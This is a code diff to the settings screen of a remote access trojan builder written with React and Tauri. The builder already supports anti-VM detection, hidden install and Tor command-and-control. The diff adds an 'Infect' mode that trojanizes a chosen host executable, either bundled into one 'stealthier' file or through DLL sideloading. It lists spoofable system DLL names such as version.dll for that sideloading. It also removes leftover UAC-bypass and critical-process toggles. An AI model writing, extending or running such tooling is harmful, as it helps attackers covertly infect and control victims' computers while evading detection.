@@ -29,14 +29,13 @@ import {
 import { RATContext } from "../rat/RATContext";
 import { AssemblyInfo, OnionServiceInfo } from "../../types";
 import { invoke } from "@tauri-apps/api/core";
-import { buildClientCmd, createOnionCmd, initTorCmd, setAutoUploadAnonFilesCmd } from "../rat/RATCommands";
+import { buildClientCmd, buildInfectedClientCmd, createOnionCmd, initTorCmd, setAutoUploadAnonFilesCmd } from "../rat/RATCommands";
 
 export const Settings = () => {
   const { setNotificationClient, notificationClient, autoUploadAnonFiles, setAutoUploadAnonFiles } = useContext(RATContext)!;
 
   const [currentStep, setCurrentStep] = useState(0);
-  // const [enableAutoSave, setEnableAutoSave] = useState(false);
-  // const [enableDebugMode, setEnableDebugMode] = useState(false);
+  const [buildMode, setBuildMode] = useState<"normal" | "infect">("normal");
   const [enableIcon, setEnableIcon] = useState(false);
 
   const [buildIp, setBuildIp] = useState<string>("127.0.0.1");
@@ -73,8 +72,24 @@ export const Settings = () => {
 
   const [iconData, setIconData] = useState<string>("");
 
+  const [dllName, setDllName] = useState<string>("version.dll");
+  const [hostExePath, setHostExePath] = useState<string>("");
+  const [isRandomDll, setIsRandomDll] = useState<boolean>(false);
+  const [infectionMethod, setInfectionMethod] = useState<"single" | "sideload">("single");
+
   const [onionServices, setOnionServices] = useState<OnionServiceInfo[]>([]);
   const [isInitializingTor, setIsInitializingTor] = useState(false);
+
+  const commonDlls = [
+    "version.dll",
+    "uxtheme.dll",
+    "winmm.dll",
+    "shcore.dll",
+    "msimg32.dll",
+    "cryptbase.dll",
+    "dnsapi.dll",
+    "winspool.drv"
+  ];
 
   useEffect(() => {
     initTorCmd()
@@ -121,7 +136,7 @@ export const Settings = () => {
     }
   }, [exeClonePath]);
 
-  const steps = [
+  const baseSteps = [
     { name: "Connection", icon: <IconServerCog /> },
     { name: "Tor", icon: <IconWifi /> },
     { name: "Install", icon: <IconFolder /> },
@@ -129,6 +144,13 @@ export const Settings = () => {
     { name: "Assembly", icon: <IconCodeCircle /> },
     { name: "Icon", icon: <IconPhoto /> },
   ];
+
+  const infectSteps = [
+    ...baseSteps,
+    { name: "Infect", icon: <IconFileSettings /> },
+  ];
+
+  const steps = buildMode === "normal" ? baseSteps : infectSteps;
 
   return (
     <div className="flex flex-col h-full w-full bg-primarybg text-white">
@@ -197,14 +219,41 @@ export const Settings = () => {
 
         <div className="w-2/3 pl-4 overflow-auto">
           <div className="bg-secondarybg rounded-xl p-4 h-full flex flex-col">
-            <h2 className="text-xl font-semibold mb-4 flex items-center">
-              <IconFileSettings className="mr-2" size={20} />
-              Client Builder
-            </h2>
+            <div className="flex items-center justify-between mb-4">
+              <h2 className="text-xl font-semibold flex items-center">
+                <IconFileSettings className="mr-2" size={20} />
+                Client Builder
+              </h2>
+              <div className="flex bg-primarybg rounded-lg p-1">
+                <button
+                  onClick={() => {
+                    setBuildMode("normal");
+                    if (currentStep > 5) setCurrentStep(5);
+                  }}
+                  className={`px-3 py-1 rounded-md text-sm transition-all ${
+                    buildMode === "normal"
+                      ? "bg-blue-700 text-white"
+                      : "text-gray-400 hover:text-white"
+                  }`}
+                >
+                  Normal
+                </button>
+                <button
+                  onClick={() => setBuildMode("infect")}
+                  className={`px-3 py-1 rounded-md text-sm transition-all ${
+                    buildMode === "infect"
+                      ? "bg-blue-700 text-white"
+                      : "text-gray-400 hover:text-white"
+                  }`}
+                >
+                  Infect
+                </button>
+              </div>
+            </div>
 
             <div
               className={`flex justify-between px-4 pt-2 ${
-                currentStep === 5 ? "pb-0" : "pb-8"
+                currentStep === steps.length ? "pb-0" : "pb-8"
               }`}
             >
               {currentStep < steps.length &&
@@ -419,25 +468,6 @@ export const Settings = () => {
                     </div>
                   </div>
 
-                  {/* <div className="flex items-center justify-between mb-2">
-                    <div className="flex items-center">
-                      <IconShield className="mr-2 text-red-400" size={20} />
-                      <span>Critical Process</span>
-                    </div>
-                    <button
-                      onClick={() => setProcessCritical(!processCritical)}
-                      className={`p-1 rounded-lg cursor-pointer ${
-                        processCritical ? "bg-blue-700" : "bg-gray-700"
-                      }`}
-                    >
-                      {processCritical ? (
-                        <IconToggleRight size={24} />
-                      ) : (
-                        <IconToggleLeft size={24} />
-                      )}
-                    </button>
-                  </div> */}
-
                   <div className="flex items-center justify-between mb-2">
                     <div className="flex items-center">
                       <IconLock className="mr-2 text-purple-400" size={20} />
@@ -471,28 +501,6 @@ export const Settings = () => {
                       />
                     </div>
                   )}
-
-                  {/* <div className="flex items-center justify-between mb-2">
-                    <div className="flex items-center">
-                      <IconShieldUp
-                        className="mr-2 text-orange-400"
-                        size={20}
-                      />
-                      <span>Attempt UAC Bypassx</span>
-                    </div>
-                    <button
-                      onClick={() => setAttemptUacBypass(!attemptUacBypass)}
-                      className={`p-1 rounded-lg cursor-pointer ${
-                        attemptUacBypass ? "bg-blue-700" : "bg-gray-700"
-                      }`}
-                    >
-                      {attemptUacBypass ? (
-                        <IconToggleRight size={24} />
-                      ) : (
-                        <IconToggleLeft size={24} />
-                      )}
-                    </button>
-                  </div> */}
 
                   <div className="flex items-center justify-between mb-2">
                     <div className="flex items-center">
@@ -755,7 +763,120 @@ export const Settings = () => {
                 </div>
               )}
 
-              {currentStep === 6 && (
+              {currentStep === 6 && buildMode === "infect" && (
+                <div className="space-y-4">
+                  <h3 className="text-lg font-medium">Infection Settings</h3>
+
+                  <div className="bg-primarybg/50 rounded-xl p-4 border border-accentx/30 mb-4">
+                     <label className="text-sm text-gray-400 mb-2 block">Infection Method</label>
+                     <div className="flex bg-secondarybg rounded-lg p-1 w-fit">
+                        <button
+                          onClick={() => setInfectionMethod("single")}
+                          className={`px-4 py-1.5 rounded-md text-sm transition-all ${
+                            infectionMethod === "single"
+                              ? "bg-blue-700 text-white shadow-lg"
+                              : "text-gray-400 hover:text-white"
+                          }`}
+                        >
+                          Single File (Bundled)
+                        </button>
+                        <button
+                          onClick={() => setInfectionMethod("sideload")}
+                          className={`px-4 py-1.5 rounded-md text-sm transition-all ${
+                            infectionMethod === "sideload"
+                              ? "bg-blue-700 text-white shadow-lg"
+                              : "text-gray-400 hover:text-white"
+                          }`}
+                        >
+                          Sideload (2 Files)
+                        </button>
+                     </div>
+                     <p className="text-xs text-gray-500 mt-2">
+                        {infectionMethod === "single"
+                          ? "Creates a single .exe that contains both the host and the client. Stealthier."
+                          : "Extracts the host and a spoofed DLL. Higher compatibility."}
+                     </p>
+                  </div>
+
+                  <div className="flex items-center justify-between mb-4">
+                    <div className="flex items-center">
+                      <IconCodeCircle className="mr-2 text-purple-400" size={20} />
+                      <span>Randomized DLL Name</span>
+                    </div>
+                    <button
+                      onClick={() => setIsRandomDll(!isRandomDll)}
+                      className={`p-1 rounded-lg cursor-pointer ${
+                        isRandomDll ? "bg-blue-700" : "bg-gray-700"
+                      }`}
+                    >
+                      {isRandomDll ? (
+                        <IconToggleRight size={24} />
+                      ) : (
+                        <IconToggleLeft size={24} />
+                      )}
+                    </button>
+                  </div>
+
+                  {!isRandomDll && (
+                    <div className="flex flex-col space-y-2 pl-4 border-l-2 border-purple-600">
+                      <label className="text-sm text-gray-400">Loader DLL Name</label>
+                      <div className="flex gap-2">
+                        <select
+                          className="bg-primarybg border border-accentx rounded-lg p-2 text-white flex-1"
+                          value={dllName}
+                          onChange={(e) => setDllName(e.target.value)}
+                        >
+                          {commonDlls.map(dll => (
+                            <option key={dll} value={dll}>{dll}</option>
+                          ))}
+                          <option value="custom">-- Custom --</option>
+                        </select>
+                        { (dllName === "custom" || !commonDlls.includes(dllName)) && (
+                           <input
+                            type="text"
+                            className="bg-primarybg border border-accentx rounded-lg p-2 text-white flex-1"
+                            placeholder="e.g. system.dll"
+                            value={dllName === "custom" ? "" : dllName}
+                            onChange={(e) => setDllName(e.target.value)}
+                          />
+                        )}
+                      </div>
+                    </div>
+                  )}
+
+                  <div className="mt-6">
+                    <label className="text-sm text-gray-400 mb-2 block">Host Executable (to be infected)</label>
+                    <div
+                      className="border-2 border-dashed border-gray-600 rounded-xl p-8 flex flex-col items-center justify-center bg-black/20 hover:border-blue-500 transition-colors cursor-pointer"
+                      onClick={() => {
+                        open({
+                          filters: [
+                            {
+                              name: "Executable File",
+                              extensions: ["exe"],
+                            },
+                          ],
+                        }).then((path) => {
+                          if (path) {
+                            setHostExePath(path as string);
+                          }
+                        });
+                      }}
+                    >
+                      <IconFileCode size={48} className="text-gray-500 mb-2" />
+                      <p className="text-gray-300 text-center">
+                        {hostExePath ? (
+                          <span className="text-blue-400 font-medium">{hostExePath.split(/[\\/]/).pop()}</span>
+                        ) : (
+                          "Select Host EXE"
+                        )}
+                      </p>
+                    </div>
+                  </div>
+                </div>
+              )}
+
+              {currentStep === (buildMode === "normal" ? 6 : 7) && (
                 <div className="space-y-6">
                   <div className="bg-black/30 rounded-xl p-4 mb-6">
                     <div className="flex items-center justify-between">
@@ -872,27 +993,22 @@ export const Settings = () => {
                           Unattended
                         </p>
                       )}
-                    </div>
-                  </div>
-
-                  <div className="bg-yellow-950/30 border border-yellow-800/50 rounded-xl p-6">
-                    <h4 className="text-lg font-medium flex items-center text-yellow-300 mb-3">
-                      <IconInfoCircle className="mr-2" size={24} />
-                      Possible Issues
-                    </h4>
-                    <div className="text-gray-300 space-y-2">
-                      <p>
-                        If the client is not building, it's because of the
-                        writing to path permissions.
-                        <p>
-                          (e.g. you won't be able to write to C:\Program Files
-                          without admin).
-                        </p>
-                        <p>
-                          <span className="font-bold">Temporary fix:</span>{" "}
-                          Restart the server with admin privileges.
-                        </p>
-                      </p>
+                      {buildMode === "infect" && (
+                        <>
+                          <p>
+                            <span className="text-gray-400">Build Mode:</span>{" "}
+                            Infect ({infectionMethod === "single" ? "Single File" : "Sideload"})
+                          </p>
+                          <p>
+                            <span className="text-gray-400">DLL Name:</span>{" "}
+                            {isRandomDll ? "Randomized" : dllName}
+                          </p>
+                          <p>
+                            <span className="text-gray-400">Host EXE:</span>{" "}
+                            {hostExePath ? hostExePath.split(/[\\/]/).pop() : "Not Selected"}
+                          </p>
+                        </>
+                      )}
                     </div>
                   </div>
                 </div>
@@ -933,27 +1049,56 @@ export const Settings = () => {
                       );
                       return;
                     }
-                    buildClientCmd(
-                      buildIp,
-                      buildPort,
-                      enableMutex,
-                      mutexName,
-                      enableUnattended,
-                      assemblyInfo,
-                      enableIcon,
-                      iconPath,
-                      enableInstall,
-                      installFolder,
-                      installFileName,
-                      group,
-                      enableHidden,
-                      antiVmDetection,
-                      useTor,
-                      torAddress
-                    );
+
+                    if (buildMode === "infect") {
+                      if (!hostExePath) {
+                        console.error("Please select a host executable to infect.");
+                        return;
+                      }
+                      buildInfectedClientCmd(
+                        buildIp,
+                        buildPort,
+                        enableMutex,
+                        mutexName,
+                        enableUnattended,
+                        assemblyInfo,
+                        enableIcon,
+                        iconPath,
+                        enableInstall,
+                        installFolder,
+                        installFileName,
+                        group,
+                        enableHidden,
+                        antiVmDetection,
+                        useTor,
+                        torAddress,
+                        isRandomDll ? "" : dllName,
+                          hostExePath,
+                          infectionMethod
+                      );
+                    } else {
+                      buildClientCmd(
+                        buildIp,
+                        buildPort,
+                        enableMutex,
+                        mutexName,
+                        enableUnattended,
+                        assemblyInfo,
+                        enableIcon,
+                        iconPath,
+                        enableInstall,
+                        installFolder,
+                        installFileName,
+                        group,
+                        enableHidden,
+                        antiVmDetection,
+                        useTor,
+                        torAddress
+                      );
+                    }
                   }}
                 >
-                  Build Client
+                  {buildMode === "infect" ? "Infect & Build" : "Build Client"}
                   <IconFileCode className="ml-2" size={20} />
                 </button>
               )}
